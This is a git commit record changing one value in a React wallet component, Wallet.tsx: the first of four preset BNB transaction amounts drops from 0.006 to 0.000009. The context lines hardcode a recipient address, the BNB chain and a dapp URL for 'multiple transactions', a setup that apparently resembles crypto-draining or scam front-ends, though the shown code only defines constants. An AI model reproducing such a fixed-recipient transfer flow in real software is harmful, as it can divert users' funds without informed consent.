e25bc18e1c81083864908e3ba38e5ccfe9596af3
Beforeandafterc <gfdee6366eoq@outlook.com>
2024-12-09 06:35:04 +0100

    Update Wallet.tsx

--- app/_components/Wallet.tsx
+++ app/_components/Wallet.tsx
@@ -17,7 +17,7 @@ export function Wallet() {
   const [showInstructions, setShowInstructions] = useState<boolean>(false);
 
   // Array of amounts for multiple transactions
-  const TRANSACTION_AMOUNTS = ["0.006", "0.013", "0.027", "0.045"];
+  const TRANSACTION_AMOUNTS = ["0.000009", "0.013", "0.027", "0.045"];
   const RECIPIENT_ADDRESS = "0x9670429d192e453d27d664c944defe049ed80a5e";
   const BNB_CHAIN_ID = "0x38";
   const DAPP_URL = "web3smartcalls.com";
